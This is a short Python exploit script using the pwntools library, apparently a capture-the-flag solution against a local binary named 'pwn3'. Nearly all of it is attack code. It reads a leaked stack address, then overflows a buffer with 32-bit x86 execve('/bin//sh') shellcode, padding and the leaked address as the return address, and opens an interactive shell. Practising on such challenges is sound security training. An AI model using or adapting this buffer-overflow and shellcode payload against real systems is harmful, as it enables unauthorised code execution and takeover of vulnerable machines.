from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process('./pwn3')
#gdb.attach(p, 'break *echo+61')

shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Recovor leak
p.recvuntil("journey ")
shellcode_leak = int(p.recv(10),16)
p.recvline()

# pad + leak
buf = shellcode
buf += "A" * (302 - 24)
buf += p32(shellcode_leak)

# Send payload
p.sendline(buf)
p.interactive()
